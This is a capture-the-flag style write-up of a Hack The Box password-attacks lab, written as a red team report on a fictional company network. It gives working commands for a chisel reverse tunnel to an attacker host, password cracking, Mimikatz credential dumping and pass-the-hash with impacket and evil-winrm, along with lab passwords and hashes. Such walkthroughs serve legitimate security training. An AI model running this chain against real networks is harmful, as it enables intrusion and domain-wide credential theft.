🛡️ HTB Password Attacks Skills Assessment: The Credential Theft Shuffle — Red Team Report
🎯 Objective

    Gain command execution on Nexura LLC's domain controller (DC01) by exploiting poor credential hygiene and lateral movement opportunities across the internal network.

🧭 Engagement Overview

    Target Company: Nexura LLC

    Scope:

        DMZ01 (172.16.119.13)

        JUMP01 (172.16.119.7)

        FILE01 (172.16.119.10)

        DC01 (172.16.119.11)

🧨 Attack Path Summary

Initial Creds (Betty) → SSH Foothold → SSH History Discovery (William)
→ Internal Pivot via Chisel → SMB/LDAP Recon
→ Legacy Password Vault → Crack bdavid → Admin on JUMP01
→ Session Hijack → Dump Stom’s Hash → Pass-the-Hash to DC01
→ 🎯 Domain Admin Access Achieved

🔓 Initial Access
➤ Leaked Credentials

jbetty: Texas123!@#

➤ SSH Access to External Host

ssh jbetty@10.129.X.X

➤ .bash_history Discovery

sshpass -p 'dealer-screwed-gym1' ssh hwilliam@file01

🛠️ Internal Network Pivoting
➤ Tunnel Internal Access via Chisel

# Attacker
chisel server -p 9001 --reverse

# Victim (DMZ01)
chisel client 10.10.14.180:9001 R:socks

➤ Configure Proxychains

socks5 127.0.0.1 1080

🔍 Internal Enumeration
➤ Nmap and CrackMapExec

    SMB, LDAP, RDP open on all internal hosts

    No lockout policy

    Password complexity enabled

➤ Enumerated Shares

proxychains smbclient -L \\172.16.119.11 -U hwilliam

🧠 BloodHound Recon

    bdavid has local admin on JUMP01

    stom (Domain Admin) has an active RemoteInteractive session on JUMP01

    Attack path: HasSession + AdminTo = Full DA compromise

🔐 Credential Dumping
➤ Found Legacy .psafe3 Vault

Employee-Passwords_OLD.psafe3

➤ Cracked with John

john psafe.hash --wordlist=rockyou.txt

✔ bdavid: caramel-cigars-reply1
✔ stom (old): fails-nibble-disturb4

🛗 Local Privilege Escalation on JUMP01
➤ RDP into JUMP01 as hwilliam

xfreerdp /u:hwilliam /p:'dealer-screwed-gym1' /v:172.16.119.7

➤ runas and Password Spray

runas /user:nexura\bdavid cmd

➤ Confirmed: bdavid is local admin on JUMP01
🧪 Credential Extraction via Mimikatz

sekurlsa::logonpasswords

Extracted stom NTLM hash:

21ea958524cfd9a7791737f8d2f764fa

🎯 Domain Controller Compromise
➤ Pass-the-Hash

proxychains impacket-wmiexec -hashes :21ea958524cfd9a7791737f8d2f764fa stom@172.16.119.11

✅ Shell as nexura\stom
➤ Dump Domain Secrets

proxychains impacket-secretsdump -hashes :21ea958524cfd9a7791737f8d2f764fa stom@172.16.119.11

➤ WinRM Shell as Administrator

evil-winrm -i 172.16.119.11 -u Administrator -H 36e09e1e6ade94d63fbcab5e5b8d6d23

whoami → nexura\administrator

✅ Summary of Findings
Finding	Risk
Credential Reuse (Betty, William, bdavid)	High
Legacy vault with valid domain creds	High
User with local admin & DA session on same host	Critical
No account lockout policy	High
Passwords follow guessable pattern	High
🛡 Recommendations

    Rotate all domain and local credentials

    Disable password reuse and use vault monitoring

    Enforce strict account lockout and password aging

    Monitor and limit local admin access

    Patch session exposure and enable LSASS protection
